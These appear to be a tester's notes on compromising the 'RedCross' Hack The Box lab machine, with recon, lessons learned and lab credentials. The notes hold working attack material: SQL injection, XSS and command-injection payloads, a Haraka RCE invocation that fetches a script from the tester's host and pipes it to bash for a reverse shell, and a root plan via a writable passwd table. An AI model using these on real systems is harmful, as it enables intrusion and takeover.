# RedCross — notes

**Target:** 10.129.57.143  _(reset 2026-09-04; IP history .225 → .235 → .248 → .143 — re-check /etc/hosts after EVERY reset!)_
**Status:** 🟩 P1 done — 3 ports (22/80/443), web funnels to `intra.redcross.htb` vhost. P3/P4 in progress.

> ⚠️ **VHOST TRAP:** always hit **`intra.redcross.htb`**, never bare `redcross.htb` (which just 301s to intra). Bitten 3×. Use `export T='https://intra.redcross.htb'`.
**Flags:** user ⬜ (SSH shell obtained) · root ⬜

## P5 FOOTHOLD ✅ — SSH as admin2
- `ssh admin2@10.129.56.248` / `tjpR5aGh` → shell.
- `id` → **uid=2020 gid=1001(associates) groups=1001(associates)** (tricia was UID 2018 → panel increments UIDs).
- `whoami` → "cannot find name for user ID 2020" (name not in passwd/NSS — provisioned oddly).
- No `sudo` binary. `/home` → `interface_data`, `public`.
- ⬜ P6 local recon from here.

### P5 FOOTHOLD #2 ✅ — Haraka RCE (harakiri3.py)
- `python3 harakiri3.py -c "wget -qO- http://<tun0>:8002/s.sh|bash" -t penelope@redcross.htb -m <ip> -p 1025` → **reverse shell on 9001** (async — took a bit).
- harakiri3.py (py3 port of 41162) **VERIFIED WORKING**.
- ✅ Landed as **penelope (uid 1000) on the REAL HOST** (not jailed): full `/etc/passwd`, `vboxadd`, hostname `redcross`, `/home/penelope` real w/ `/bin/bash`. Haraka runs as penelope.
- 🎯 penelope = owner of iptctl.c → **privesc identity acquired WITHOUT cracking her hash** (Haraka RCE > 1h of bcrypt; crack-economics call validated).
- Host users of note: `postgres` (/bin/bash, /var/lib/postgresql), `mysql`, `ftp`, `www-data`.
- ⬜ grab `user.txt` (likely /home/penelope) · P6: `sudo -l`, SUID (iptctl?), etc.

### ⭐ P6 — DB creds in webroot (`/var/www/html` grep)
Two PostgreSQL databases on 127.0.0.1:
- **`redcross`** (user `www`/`aXwrtUO9_aa&`) — the web app data.
- **`unix`** (users `unixnss`/`fios@ew023xnw` + `unixusrmgr`/`dheu%7wjx8B&`) — **the tell.**
  - db named `unix` + `unixnss` (NSS reader) + `unixusrmgr` (user manager) = **PostgreSQL-backed NSS/PAM**. The box's *system users live in Postgres* (libnss-pgsql + pam-pgsql). Explains: admin panel creating "real OS accounts", and `whoami` failing for the jail uid (NSS lookup).
  - We're now penelope **on the host** → pg_hba allows **localhost** → connect locally with these creds.
  - `unixusrmgr` = write access to the system-user store → **create/modify a privileged OS user (uid 0 / sudo grp) that PAM/NSS honors** → privesc. (This is the synopsis PAM/NSS root — pages 14-16 NOT read.)

### 🎯 PRIVESC — the `unix.passwd` table IS the system passwd (PAM/NSS)
`SELECT * FROM passwd` (as unixusrmgr) →
```
username | passwd(md5crypt $1$) | uid | gid | homedir | shell
tricia   | $1$WFsH/kvS$5gAjMYSvbpZFNu//uMPmp. | 2018 | 1001 | /var/jail/home | /bin/bash
```
- Columns: `username, passwd, uid, gid, gecos, homedir, shell` — a full passwd row.
- **`homedir=/var/jail/home` = why panel users are jailed** (the chroot was in their DB row).
- **ROOT plan:** unixusrmgr can INSERT → add a user with **uid=0, gid=0, homedir=/root (NOT the jail), shell=/bin/bash**, known md5crypt password → `su` → **root, unjailed**.
- tricia hash = md5crypt → hashcat `-m 500` (not needed; we mint our own).

---

## 🔑 CREDENTIALS
| identity | secret | works-on | verified |
|----------|--------|----------|----------|
| guest | guest | intra portal login → app.php guest panel | ✅ works (uid 5) |
| admin2 | tjpR5aGh | created via admin.redcross.htb user-mgmt; **try SSH:22** (panel issues real OS accounts) | ⬜ test SSH + admin login |
| tricia | _(no pw yet)_ | existing system user — **UID 2018, GID 1001**; SSH target | ⬜ |
| charles | **cookiemonster** | intra portal (role 1 employee) | ✅ intra; ✖ SSH; ✖ admin panel ("Not enough privileges!" — role-gated, needs role 0) |
| penelope | bcrypt — **NOT rockyou-crackable (1h)** | DB role 1 + owner of iptctl.c → **got SHELL via Haraka RCE** (no crack needed) | ✅ shell on host |
| www | `aXwrtUO9_aa&` | **PostgreSQL** local 127.0.0.1 dbname=**redcross** (web data) | ⬜ |
| unixnss | `fios@ew023xnw` | PostgreSQL local dbname=**unix** (NSS reader) | ⬜ |
| unixusrmgr | `dheu%7wjx8B&` | PostgreSQL local dbname=**unix** (user MANAGER → write access) | ⬜ **privesc** |
| admin | bcrypt — **NOT cracked (1h)** | intra DB role **0** (superuser) | ✖ not the path |
| tricia | bcrypt — **NOT cracked (1h)** | role 100, @contoso.com, system user UID 2018 | ✖ not the path |

**Hashes → `loot/redcross_bcrypt.hash`** (order: admin, penelope, charles, tricia, guest).
The **guest** hash (line 5) should crack to `guest` — use it to verify the file transferred
clean (no BOM/CRLF) before trusting a "not cracked" on the others.

---

## ⭐ FIREWALL OPENED via IP allowlist (admin panel / iptctl)
Day-one nmap = `22,80,443` (65532 filtered = firewall). After **allowlisting my IP** through
the admin panel, re-scan reveals the **internal service tier**:
```
21/tcp   ftp
22/tcp   ssh
80/tcp   http
443/tcp  https
1025/tcp NFS-or-IIS?   ← fingerprint
5432/tcp postgresql     ← DB! try creds → RCE
```
→ Validates the Lesson-#6 deduction (filtered = firewall; whitelist punches through). New P2 triage:
- **FTP 21** — anon login? known creds (charles/penelope)? writable + web overlap?
- **PostgreSQL 5432** — try `charles:cookiemonster`, penelope, admin, DB creds. Superuser → `COPY … FROM PROGRAM` = RCE; also file read/write.
- **1025 = Haraka ESMTP 2.8.8** (Node.js SMTP). Banner via **`ftp <ip> 1025`** or `telnet` (client reads the 220 greeting; `nc`/`swaks` "silent" = didn't wait / buggy instance). → banner: `220 redcross ESMTP Haraka 2.8.8 ready`.
  - **Vulnerable: Haraka < 2.8.9 RCE** (CVE-2016-1000282) → `searchsploit haraka` → `exploits/linux/remote/41162.py`. Alternate RCE foothold.
    - 41162.py is **Python 2 + hardcoded port 25** → won't run on Kali / wrong port. Ported → `exploits/harakiri3.py` (py3 + `-p 1025`). Original reviewed: clean, no backdoor. Vuln = attachment plugin shells out with unsanitized zip inner-filename → inject via `a";<cmd>;echo "a.zip`.
    - Fire: `python3 harakiri3.py -c "wget -qO- http://<tun0>:8001/s.sh|bash" -t penelope@redcross.htb -m <ip> -p 1025` (keep -c short/quote-free; SMTPDataError 450 = success; async pop).
- FTP = **vsftpd 2.0.8+** (NOT 2.3.4 backdoor). Postgres = **9.6.7–9.6.12**, cert CN `redcross.redcross.htb`. Postgres is a **separate DB** from the SQLi'd MariaDB.

## Kill chain
- [ ] P1 Recon (nmap full + services)
- [ ] P3 Web enum (vhosts, dirbrute, source, auth mechanism)
- [ ] P4 Web exploit — vuln-class sweep on each input
- [ ] P5 Foothold + stabilize
- [ ] P6 Local recon (sudo -l, SUID, cron, creds, internal ports)
- [ ] P6b Container? (if root-but-wrong-namespace: mounts, caps, sock, netns)
- [ ] P7 Privesc → root

---

## Hosts / surface
- 10.129.56.225 = `redcross.htb`
- **22/tcp** — OpenSSH 7.9p1 Debian 10+deb10u3 (Buster). Port only; no creds yet.
- **80/tcp** — Apache 2.4.38 (Debian). Redirects → `https://intra.redcross.htb/`
- **443/tcp** — Apache 2.4.38, ssl/http. Also → `https://intra.redcross.htb/`
  - SSL cert: `CN=intra.redcross.htb`, `O=Red Cross International`, `ST=NY`, `C=US`
  - Cert validity 2018-06-03 → 2021-02-27 (**expired, self-signed** → curl needs `-k`)

### /etc/hosts
```
10.129.56.248   redcross.htb intra.redcross.htb admin.redcross.htb
```
Name-based vhost routing (both 80 & 443 redirect to the `intra` vhost) → **vhost fuzz is high-value**.

### vhosts
- ✅ vhost enum COMPLETE (corrected `-fl 10 -ac`): exactly **two** — `intra` + `admin`. No others.
- `intra.redcross.htb` — employee/provider portal (worked so far)
- **`admin.redcross.htb`** — **admin portal**, `?page=login` is legit. Found manually, NOT by fuzz.
  - **ACCESS = PHP Session ID reuse across subdomains** (authz bypass, confirmed writeup p7): brute force fails, but take the `PHPSESSID` from a logged-in **intra** session (even guest) and set it on **admin.redcross.htb** via a cookie manager → refresh → IT Admin panel accepts it. admin panel trusts intra's session store. (Skills Learned: "Authentication bypass via PHP Session ID reuse.")
  - Has a **user-management panel** showing **Username / UID / GID / Action** → these are **real OS accounts**, not just app roles.
  - **XSS** in "Add virtual user" field (`<script>alert(document.cookie)</script>`) → fires in real admin's browser → steal *admin's* PHPSESSID (writeup p9).
  - **OS command injection** in the **`ip`** parameter of Network Access/firewall (`ip=1.1.1.1; <cmd>&action=deny`) → output returned → **shell as www-data** (writeup p10). NOTE: this DOES work — it's the web panel's `ip` param, distinct from the `iptctl.c` setuid BOF.
    - Existing user: `tricia` — UID 2018, GID 1001.
    - Create-user action issued: **`admin2 : tjpR5aGh`** ("Provide this credentials to the user").
  - ⭐ Implication: panel provisions **system users** → **SSH (port 22) is now a live avenue.** Try `ssh admin2@10.129.56.248` with `tjpR5aGh`.
  - ⚠️ **MISSED by our vhost fuzz** — original run used broken `-fc 301`/size filter (reflected-hostname 301 trap). We flagged it as an unreliable negative + queued a corrected `-fl`/`-ac` run, then never executed it. Classic ambiguous-negative left unclosed.
  - ⬜ **RE-RUN vhost fuzz properly NOW** — the broken negative may also be hiding *other* vhosts (api? etc.). Don't assume `admin` is the only one:
    ```
    ffuf -k -u https://10.129.56.248/ -H 'Host: FUZZ.redcross.htb' \
      -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fl 10 -ac -t 20
    ```

### intra.redcross.htb — the portal
- **"RedCross Messaging Intranet — Employees & providers portal"**
- Two audiences hinted: **employees** *and* **providers** (likely two roles / two login paths).
- Routing via a **`page` GET param**: `/?page=login`. → candidate router; watch for **LFI / file-include** on `page=` (P4 taint source).
- ✅ `documentation/` — dir listing off (403), but holds **`account-signup.pdf`** → `loot/account-signup.pdf`. The onboarding doc: expected to describe how to actually create an account (endpoint / API / hidden flow) since UI has no register.
- `action=FUZZ` dispatcher: **unknown action → size 0** (empty). Valid actions emit text.
  - ✅ Fuzzed properly (`-fs 0`, and again with dummy user/pass/email/name params) → **only `login` + `contact` exist**. Confirmed negative. **No register verb here → account comes from elsewhere.**
- Login form: `POST /?page=login`, field `action=go login`.
- Static: `/images/logo.png`.
- ⬜ TODO: `whatweb -a3`, response headers, **session cookie name/shape**, the actual login page HTML.

### Directory map (ffuf on intra.redcross.htb)
Root dirs:
- `/images/` 301
- `/pages/` 301        ← the router's include dir
- `/documentation/` 301  ← **stands out — API/endpoint docs? browse it**
- `/javascript/` 301 (→ `/javascript/jquery/`, jquery.js)
- `/server-status` 403 (Apache mod_status, forbidden)

`/pages/*.php` (this is what `?page=X` maps to → `pages/X.php`):
- `login.php`   200
- `contact.php` 200
- `header.php`  200 (layout)
- `bottom.php`  200 (layout)
- `actions.php` **302** ← action/handler endpoint (login POST etc.), redirects
- `app.php`     **302** ← the authenticated app area, redirects to login when unauthed

### actions.php — the dispatcher (POST, routes on `action=`)
Session cookie: **`PHPSESSID`** (stock PHP session).

- **login**: `user=&pass=&action=login` → bad creds return `Wrong data!` (200, `refresh: 3;url=/`)
- **contact**: `subject=&body=&cback=&action=contact` → `Contact request sent.` (200)
  - `cback` = "contact phone or email" (free text). subject/body/cback all **attacker-controlled text a staff member likely reads later** → **STORED XSS candidate** (source now; sink = wherever staff review contact requests). Test with a blind/OOB XSS payload → steal staff `PHPSESSID` → reach `app.php`.
  - 🔓 **SIGNUP via contact form** (per account-signup.pdf): subject must contain **"credentials"**, body must contain **`username=<name>`** → automated system auto-provisions an account (else forwarded to human IT admin). This is how we get our first account.
    - `username=` value is parsed → used in account creation → **injection candidate** (SQLi/logic) to watch on the *next* pass. First, happy path.
- `action` is a **switch dispatcher** → likely more verbs than login/contact (register? logout? reset?). ⬜ **fuzz `action=FUZZ`**.
- Still **no register UI seen**. ⬜ try `?page=register`, and the action fuzz above.

### app.php — authenticated guest panel (login guest:guest)
- **"Web messaging system 0.3b"** (beta). Messages keyed by numeric **uid**.
- Seen: msg from **admin (uid 1)** → **guest (uid 5)** ("low privilege access…").
- **`UserID` input field** on the panel → message-lookup by uid. **TOP P4 target:**
  - **IDOR** — set `UserID=1` → read **admin's** messages (vertical access). Enumerate uids 1..N.
  - **SQLi** — if `UserID` is concatenated into the query (0.3b beta → likely): `1'`, `1 AND 1=1`, `1 UNION SELECT…`.
  - ⬜ capture the exact request (Burp): endpoint (actions.php? app.php?), method, param name, `action=` value.
- Other uids referenced: admin=1, guest=5 → **uids 2,3,4 exist** (employees/providers?). Enumerate them.

### ⭐ COOKIES = application inputs (the real P4 surface)
Authed request carries: `LANG=EN_US; SINCE=1788459110; LIMIT=10; DOMAIN=intra` (+ PHPSESSID).
These are read server-side to build the message query/view → **test each as a tainted input:**
| cookie | value | likely use | vuln class to test |
|--------|-------|-----------|--------------------|
| `LANG` | EN_US | include a lang file (`EN_US.php`?) | **LFI** → try `php://filter/convert.base64-encode/resource=…` to **read app SOURCE** (whitebox!) |
| `SINCE` | 1788459110 | `WHERE date >= SINCE` | **SQLi** (numeric in WHERE) |
| `LIMIT` | 10 | `LIMIT 10` clause | **SQLi** (LIMIT-clause injection) |
| `DOMAIN` | intra | table/db/host selector or WHERE | **SQLi** / logic (string → easy `'` test) |

Priority: **LANG LFI to read source** (whitebox-first per methodology → find the exact SQLi in code), then SQLi on SINCE/LIMIT/DOMAIN.

### GET params on the authed app
- `page` — router (→ pages/X.php)
- **`o`** — message/object id: `/?o=1&page=app` → `WHERE id = o`. **IDOR** (walk o=1,2,3…) + **SQLi** (`o=1'`). Another top target.
  - ✅ Confirmed **dynamic** under live session: o=1→1211B, o=2→793B, o=3→793B (no-cookie → 302/463B). Param is live & testable.
  - ⚠️ Earlier sqlmap "o not dynamic / can't establish SSL" was **stale IP (.235)** in the request file, NOT a param/SSL issue. Rebuild request against current IP + fresh PHPSESSID.
  - ✅✅ **`o` IS SQL-INJECTABLE** — error-based, **MariaDB**, verbose `DEBUG INFO` errors ON. Manual `o=5'` →
    `...error near '5' or dest like '5'') LIMIT 10 at line 1`
  - **Inferred query:** `SELECT ... WHERE (<col> like '$o' or dest like '$o') LIMIT $LIMIT`
    - `$o` is **string/LIKE context, used TWICE**, wrapped in `( … )`, followed by `LIMIT $LIMIT` (the `LIMIT` cookie).
    - Balancer to close cleanly: **`o=5')-- -`** (closes the paren after 1st LIKE, comments out `or dest like…` + LIMIT). Confirm by error disappearing.
  - ⚠️ **WAF present:** sqlmap got **403 × 20** on its payloads (AND/UNION/SLEEP keywords) — but a bare `'` passes. → **manual / WAF-evasion, not vanilla sqlmap.** (My earlier "o is (int)-cast, SQLi-dead" call was WRONG — the 403 was the WAF, not app validation.)
  - Box drops ("can't establish SSL") on **time-based** probes → avoid `T`; error-based/UNION only.
  - ✅ **HTB hint confirms `o` is the path forward.** Exploit → dump DB → creds/hashes → escalate.

**Authed P4 input inventory:** `o` (GET) · `LANG`/`SINCE`/`LIMIT`/`DOMAIN` (cookies) · `UserID` (form) · `page` (router/LFI).

### Routing model — CONFIRMED
`?page=X` → server does roughly `include("pages/X.php")`.
- **LFI candidate**, but two constraints: `pages/` **prefix** (breaks a leading `php://filter` wrapper — wrapper must be at offset 0) and a `.php` **suffix** appended.
- So naive `page=../../etc/passwd` gets `.php` glued on; null-byte truncation is dead on PHP7. Reading app **source** via `php://filter/convert.base64-encode` is blocked by the `pages/` prefix *unless* the param is used somewhere without that prefix. → probe it, don't assume.
- `actions.php` + `app.php` (both 302) are the real dynamic surface once authenticated.

### Read of the surface
- Tiny external footprint: SSH + web only. **The web on 443 is the door**; SSH is inert until creds surface.
- Everything routes by *hostname* — hit the raw IP and you get the wrong/default vhost. Host header / hosts file matters.
- Cert = free intel: org name, state, and the `intra` hostname. Self-signed + long-expired, so it's an internal portal, not public-facing.

---

## 7. Lessons

**1. A broken-filter negative is not a negative — and close it before moving on.**
Missed `admin.redcross.htb` because the vhost fuzz used `-fc 301`/size filtering against
reflected-hostname 301s (size wobbles with the fuzzed word). We flagged the run as
unreliable and *queued* a corrected `-fl 10 -ac` sweep — then never ran it and got pulled
into `documentation/`. That undone retest cost the entire admin portal. Corrected filter
found `admin` instantly. Rule: when you mark a negative as suspect, run the retest *now*.

**2. A WAF 403 on tooling ≠ app-side input validation.** I misread sqlmap's `403 × 20`
on `o` as `(int)`-cast / "SQLi-dead." It was a WAF swatting sqlmap's keyword-heavy payloads.
A manual bare `o=5'` threw a MariaDB syntax error → `o` is fully injectable (error-based).
Distinguish "the tool got blocked" from "the param isn't vulnerable" — test by hand before
trusting a tool's negative.

**3. Same feature, two implementations — test the reachable path, don't generalize from one file.**
`iptctl.c` (the setuid C binary) builds its command as an `execvp` argument **array** + `inet_pton`
→ structurally cmdi-safe (its bug is a BOF, not injection). BUT the **web admin panel's Network
Access `ip` parameter** is a *separate PHP code path* that IS OS-command-injectable:
`ip=1.1.1.1; <cmd>&action=deny` → returns output → **www-data shell** (writeup p10).
Lesson: finding one safe implementation of a feature does NOT mean the feature is safe — the
same functionality often has another code path (here: PHP wrapper vs C binary). My initial
"cmdi is structurally dead here" was right about the *binary* and wrong about the *feature*.

**4. A sanitizer placed *after* the unsafe operation is a decoy.** `iptctl.c` validates
action/IP, but only *after* `strcpy(inputAction,argv[1])` / `fgets(buf,360,stdin)` already
overflowed the stack buffers — and only weakly (`strstr` substring + valid IP), so you can
satisfy the check while carrying the overflow. Sanitizer-after-sink = no sanitizer.
Four stack BOFs (CWE-121); runs privileged (`setuid(0)`).

**5. Recognizing a jail/chroot from evidence.** admin2's SSH drops into a cage:
`ls /` missing `/proc /var /tmp /sys /run`; no `hostname`/`ip`/`sudo`; `whoami` can't resolve
its own UID (stub `/etc/passwd`); everything `root:associates`. Any one is suspicious;
together, conclusive. **`/proc` absence is the best discriminator** (chroot) — if present,
check `/proc/1/cgroup` for container. A jail is itself a *finding* → pivot, don't grind.

**6. "How would I know?" = hypothesis under uncertainty, falsified cheaply.** You don't
*know* — you form the highest-probability hypothesis from tells and test it fast. Here:
add-user → *local* account (UID/GID columns + plaintext cred issued + **idle open SSH the
whole box**); whitelist → SSH (day-one nmap `65532 filtered` = firewall to punch through).
Notice the anomaly → propose the link → one cheap test (`ssh admin2@…`). That's not guessing;
guessing is random, this is evidence-weighted and falsifiable.

**7. When to *call* a dead end:** two conditions, both required — (a) you've confirmed a
restricted/jailed env, and (b) a *systematic* reachable sweep (passwd, `/proc`, binary set,
home dirs, writable service files) is barren. Then EV(more digging here) < EV(pivot). Do the
sweep so the call is evidence-based, not fatigue-based; "dead end" means "pivot is elsewhere,"
not "delete from memory."

**8. Cookie state → test AUTHZ, not just injection (session reuse across subdomains).**
We logged the cookies (`LANG/SINCE/LIMIT/DOMAIN`) as inputs and tested them for SQLi/LFI, but
under-weighted the class they scream for: **authorization/identity tampering.** The admin-panel
break-in is **PHP Session ID reuse** — a `PHPSESSID` minted by low-priv `intra` is *accepted by*
`admin.redcross.htb` (shared session store / parent-domain cookie). Rule: when an app carries
state in cookies — and especially when two apps/subdomains share a session cookie — test whether
a session from the **lower-priv** app is honored by the **higher-priv** one. The tell was already
on the board (`DOMAIN=intra` context cookie + a shared `PHPSESSID`); we just needed to test *who
am I / where am I allowed*, not only *can I break the query*.

**9. Banner-grab tooling matters — use a client that reads the greeting.** Port 1025 (Haraka
ESMTP 2.8.8) looked "dead" to `nc`/`swaks` because they didn't wait for / print the server's
`220` greeting. `ftp <ip> 1025` / `telnet` actively read+print it. When a service is "silent,"
switch clients (ftp/telnet/openssl s_client) before concluding it's not talking.

## 8. Command log
- `nmap -p- --min-rate 5000 -oA scans/allports 10.129.56.225` → 22,80,443
- `nmap -sCV -p22,80,443 -oA scans/services 10.129.56.225` → versions + cert (intra.redcross.htb)
- `curl -k https://intra.redcross.htb` → portal landing; `page=` router, login form
- `ffuf .../FUZZ -recursion -recursion-depth 2` → images, pages, documentation, javascript, server-status(403)
- `ffuf .../pages/FUZZ.php -mc 200,302` → login, contact, header, bottom, actions(302), app(302)
- `ffuf .../?FUZZ= -fs 463` (param name fuzz on index) → only **`page`** (sole GET param on `/`)
- POST actions.php `action=login` (user=tes/pass=tes) → "Wrong data!"
- POST actions.php `action=contact` (subject/body/cback) → "Contact request sent."
- `ffuf documentation/FUZZ.pdf -mc 200` → **account-signup.pdf**
- POST actions.php `action=contact` subject~credentials body=`username=errbit` → **"Temporary credentials … guest:guest"**
- `ffuf -H 'Host: FUZZ.redcross.htb' -fl 10 -ac` → **admin** vhost (found instantly; the `-fc 301` run had missed it)
- sqlmap on `o` (WAF-evasion) → dumped DB **`redcross`**: tables `users` (5 bcrypt), `messages`, `requests`(empty). Output: `~/.local/share/sqlmap/output/intra.redcross.htb/`

### DB `redcross`.messages — internal narrative (context)
Threads between admin(1)/penelope(2)/charles(3)/tricia(4) reference: "alerts popping everywhere"
on the **admin webpanel** (XSS tell), "we applied some **input filtering on the contact form**",
and "possible **vuln on your admin side**". Background — we already have admin-panel access via
the user-creation path; not chasing the XSS route.
